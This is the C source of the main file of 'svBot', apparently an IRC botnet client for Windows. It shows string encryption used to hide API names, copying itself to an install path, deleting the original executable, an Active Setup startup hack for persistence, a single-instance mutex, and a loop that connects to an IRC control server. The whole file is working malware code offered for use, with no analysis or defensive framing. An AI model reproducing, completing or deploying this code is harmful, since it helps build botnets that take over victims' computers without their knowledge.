/*
    svBot
    Coded by a59
    [11 - 11 - 07]

	NOTES:
	1.	You have to update ALL encrypted strings everytime you want to change any (just one).
		This is because the encryption key is generated randomly when you run the crypt tool.
*/

#include "includes.h"
//#include "func.h"
#include "config.h"
/*
#ifdef CRYPTO
char str_wsdll[] = "\x3C\x3D\x3F\x78\xD2\x7C\x59\x3A\x8D\x1D";
char str_wsa[] = "\x1C\x1D\x4C\x74\x95\x2F\x05\x2A\x94\x01";
char str_sock[] = "\x38\x21\x6E\x4C\x84\x3A";
char str_ghbn[] = "\x2C\x2B\x79\x4F\x8E\x3D\x03\x3C\x98\x1F\x80\x70\x97";
char str_conn[] = "\x28\x21\x63\x49\x84\x2D\x03";
char str_send[] = "\x38\x2B\x63\x43";
char str_recv[] = "\x39\x2B\x6E\x51";
char str_closesock[] = "\x28\x22\x62\x54\x84\x3D\x18\x3D\x8A\x14\x95";
char str_htons[] = "\x23\x3A\x62\x49\x92";
#endif // CRYPTO

bool load_winsock( void )
{
#ifdef CRYPTO
	u_char *dec_wsdll = decrypt( str_wsdll, sizeof(str_wsdll), crypt_key );
//	printf( "dec_wsdll == \"%s\"\n", dec_wsdll );
	HMODULE hmWS = LoadLibrary( (LPCSTR)dec_wsdll );
	memset( dec_wsdll, 0, sizeof(dec_wsdll) );
	if ( !hmWS ) return false;

	u_char *dec_wsa = decrypt( str_wsa, sizeof(str_wsa), crypt_key );
//	printf( "dec_wsa == \"%s\"\n", dec_wsa );
	fWSAStartup = (WSAS)GetProcAddress( hmWS, (LPCSTR)dec_wsa );
	memset( dec_wsa, 0, sizeof(dec_wsa) );
	if ( !fWSAStartup ) return false;

	u_char *dec_sock = decrypt( str_sock, sizeof(str_sock), crypt_key );
//	printf( "dec_sock == \"%s\"\n", dec_sock );
	fsocket = (SOCK)GetProcAddress( hmWS, (LPCSTR)dec_sock );
	memset( dec_sock, 0, sizeof(dec_sock) );
	if ( !fsocket ) return false;

	u_char *dec_ghbn = decrypt( str_ghbn, sizeof(str_ghbn), crypt_key );
//	printf( "dec_ghbn = \"%s\"\n", dec_ghbn );
	fgethostbyname = (GHBN)GetProcAddress( hmWS, (LPCSTR)dec_ghbn );
	memset( dec_ghbn, 0, sizeof(dec_ghbn) );
	if ( !fgethostbyname ) return false;

	u_char *dec_conn = decrypt( str_conn, sizeof(str_conn), crypt_key );
//	printf( "dec_conn = \"%s\"\n", dec_conn );
	fconnect = (CON)GetProcAddress( hmWS, (LPCSTR)dec_conn );
	memset( dec_conn, 0, sizeof(dec_conn) );
	if ( !fconnect ) return false;

	u_char *dec_send = decrypt( str_send, sizeof(str_send), crypt_key );
//	printf( "dec_send = \"%s\"\n", dec_send );
	fsend = (SEND)GetProcAddress( hmWS, (LPCSTR)dec_send );
	memset( dec_send, 0, sizeof(dec_send));
	if ( !fsend ) return false;

	u_char *dec_recv = decrypt( str_recv, sizeof(str_recv), crypt_key );
//	printf( "dec_recv = \"%s\"\n", dec_recv );
	frecv = (RECV)GetProcAddress( hmWS, (LPCSTR)dec_recv );
	memset( dec_recv, 0, sizeof(dec_recv) );
	if ( !frecv ) return false;
	
	u_char *dec_htons = decrypt( str_htons, sizeof(str_htons), crypt_key );
//	printf( "dec_htons = \"%s\"\n", dec_htons);
	fhtons = (HTONS)GetProcAddress( hmWS, (LPCSTR)dec_htons );
	memset( dec_htons, 0, sizeof(dec_htons) );
	if (!fhtons ) return false;

	u_char *dec_close = decrypt( str_closesock, sizeof(str_closesock), crypt_key );
//	printf( "dec_close =\"%s\"\n", dec_close );
	fclosesocket = (CLSO)GetProcAddress( hmWS, (LPCSTR)dec_close );
	memset( dec_close, 0, sizeof(dec_close) );
	if ( !fclosesocket ) return false;

#else
	HMODULE hmWS = LoadLibrary( "ws2_32.dll" );
	if ( !hmWS ) return false;
	fWSAStartup = (WS)GetProcAddress( hmWS, "WSAStartup" );
	if ( !fWSAStartup ) return false;
	fsocket = (SK)GetProcAddress( hmWS, "socket" );
	if ( !fsocket ) return false;
	fgethostbyname = (GHBN)GetProcAddress( hmWS, "gethostbyname" );
	if ( !fgethostbyname ) return false;
	fhtons = (HTONS)GetProcAddress( hmWS, "htons" );
	if (!fhtons ) return false;
	fconnect = (CON)GetProcAddress( hmWS, "connect" );
	if ( !fconnect ) return false;
	fsend = (SEND)GetProcAddress( hmWS, "send" );
	if ( !fsend ) return false;
	frecv = (RECV)GetProcAddress( hmWS, "recv" );
	if ( !recv ) return false;
	fclosesocket = (CLSO)GetProcAddress( hmWS, "closesocket" );
	if ( !closesocket ) return false;
#endif // CRYPTO

	WSADATA wsa;
	if ( fWSAStartup(0x0202, &wsa) != 0 ) 
	{
#ifdef DBG_LOG
		DbgPrintFile( "[-] WSAStartup() fail!" );
#endif // DBG_LOG
		return false;
	}

	return true;
}
*/

HANDLE hStartup; // blah

#ifdef _DEBUG
int main( int argc, char *argv[] )
#else
int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd )
#endif // _DEBUG
{
#ifdef DBG_LOG
	DeleteFile( "\\debug.log" );
#endif // DBG_LOG

	// see if we can load winsock
	WSADATA wsa;
	if ( WSAStartup(0x0202, &wsa) != 0 ) 
	{
#ifdef DBG_LOG
		DbgPrintFile( "[-] WSAStartup() fail!" );
#endif // DBG_LOG
//		bot_uninstall();
		return 1; // maybe someday, right?
	}

	char szInstallPath[MAX_PATH]="";
	if ( str_exedir[0] == '%' )
		ExpandEnvironmentStrings( str_exedir, szInstallPath, MAX_PATH );
	else
		strcpy( szInstallPath, str_exedir );

	// this is a cheap fix for active setup startup
	// don't fuck with it unless you got a better method
#ifndef _DEBUG
	if ( !strcmp(lpCmdLine, "/b") )
#else
	if ( !strcmp(argv[1], "/b") )
#endif // _DEBUG
	{
		xCreateProc( szInstallPath );
		return 0;
	}

	char szCurrentPath[MAX_PATH]="";
	GetModuleFileName( NULL, szCurrentPath, MAX_PATH );
	if ( szInstallPath[0] == '\\' ) 
	{
		char *pszPath = str_sub( szCurrentPath, 2, strlen(szCurrentPath) );
		memset( szCurrentPath, 0, sizeof(szCurrentPath) );
		strcpy( szCurrentPath, pszPath );
	}

#ifdef DBG_LOG
	DbgPrintFile( "[*] main_thread() szInstallPath: '%s', szCurrentPath: '%s'.", szInstallPath, szCurrentPath );
#endif // DBG_LOG

	if ( strcmp(szCurrentPath, szInstallPath) != 0 )
	{
		if ( bot_install(szCurrentPath, szInstallPath) == true )
		{
			xCreateProc( szInstallPath );
			bot_rmself();
		}
	}
	else
	{
#ifdef DBG_LOG
		DbgPrintFile( "[*] bot_install() don't need to copy..." );
#endif
	}

	// check if the bot is already running...
#ifdef CRYPTO
	u_char *dec_mutex = decrypt( cfg_mutex, size_mutex, crypt_key );
	HANDLE hMutex = CreateMutex( NULL, FALSE, (char *)dec_mutex );
	memset( dec_mutex, 0, sizeof(dec_mutex) );
#else
	HANDLE hMutex = CreateMutex( NULL, FALSE, cfg_mutex );
#endif // CRYPTO

	if ( hMutex != NULL && GetLastError() == ERROR_ALREADY_EXISTS )
	{
#ifdef DBG_LOG
		DbgPrintFile( "[-] bot already running..." );
#endif // DBG_LOG
//		bot_rmself();
		return 0;
	}

	hStartup = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)thread_startup, szInstallPath, 0, 0 );
//	if ( !hStartup ) bot_uninstall();
	
	srand( GetTickCount() );

	// start the irc client loop (obviously)
	while ( irc_start() == true )
	{
#ifdef _DEBUG
		Sleep( 5 * 1000 );
#else
		Sleep( 30 * 1000 ); // don't want to get throttled
#endif // _DEBUG
	}

	return 0;
}